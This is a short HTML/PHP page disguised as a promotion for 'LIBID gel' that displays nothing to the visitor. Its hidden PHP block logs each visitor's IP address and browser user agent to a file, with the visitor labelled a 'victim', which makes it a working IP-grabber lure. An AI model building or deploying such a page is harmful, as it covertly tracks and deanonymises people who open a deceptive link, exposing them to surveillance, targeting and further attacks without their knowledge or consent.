
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8"/>
<title>Promoçao LIBID gel</title>
<link rel="icon" href="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQbwIfYbUEbNptPeMxlDgSfB_HImAohu1HyEg&usqp=CAU">
</head>
<body>
<!-- Clownters -->
<?php
if (!empty($_SERVER['HTTP_CLIENT_IP']))
    {
      $ipaddress = $_SERVER['HTTP_CLIENT_IP']."\r\n";
    }
elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
    {
      $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR']."\r\n";
    }
else
    {
      $ipaddress = $_SERVER['REMOTE_ADDR']."\r\n";
    }
$useragent = " User-Agent: ";
$browser = $_SERVER['HTTP_USER_AGENT'];
$file = 'ips.txt';
$victim = "IP: ";
$fp = fopen($file, 'a');
fwrite($fp, "\033[1;34m  IP: \033[0;32m" . $ipaddress);
fwrite($fp, "\033[1;34m  Navegador: \033[0;32m" . $browser);
fwrite($fp, "\n\n");
fclose($fp);
?>
</body>
</html>
